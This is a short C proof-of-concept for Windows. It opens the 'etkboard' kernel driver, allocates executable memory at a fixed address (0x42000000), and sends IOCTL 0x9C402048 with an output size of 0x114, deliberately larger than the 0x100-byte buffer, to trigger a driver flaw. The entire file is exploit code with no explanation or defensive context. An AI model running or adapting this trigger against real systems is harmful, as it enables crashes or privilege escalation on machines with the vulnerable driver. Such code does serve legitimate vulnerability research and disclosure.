#include <windows.h>
#include <stdio.h>
typedef unsigned long long QWORD; // DWORD64						

int main(int argc, char* argv[]) {
  HANDLE hDriver = CreateFileW(L"\\\\.\\etkboard", GENERIC_READ | GENERIC_WRITE, 0,
                                NULL, OPEN_EXISTING, 0, NULL); // Get a handle to the driver

  if (hDriver != INVALID_HANDLE_VALUE) {
    printf("[i] Found driver\n");
    LPVOID lpOutMemoryArea = VirtualAlloc((LPVOID)0x42000000, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpOutMemoryArea == NULL) {
      printf("[!!!] Unable to allocate memory\n");
      ExitProcess(-1);
    }
    else {
      printf("[i] Allocated memory\n");
      memset(lpOutMemoryArea, 0x00, 0x100);
    }
    DWORD dwIoctl = 0x9C402048; // IOCTL
    printf("[i] Sending IOCTL 0x%X\n", dwIoctl);
    DWORD dwBytesOut = 0;
    // nOutBufferSize MUST >= 0x114; No input buffer required
    NTSTATUS dwLastError = DeviceIoControl(hDriver, dwIoctl, NULL, 0, lpOutMemoryArea, 0x114, &dwBytesOut, NULL);
  }
  else {
    printf("[!!!] Unable to find driver\n");
    ExitProcess(-1);
  }
  ExitProcess(0);
}
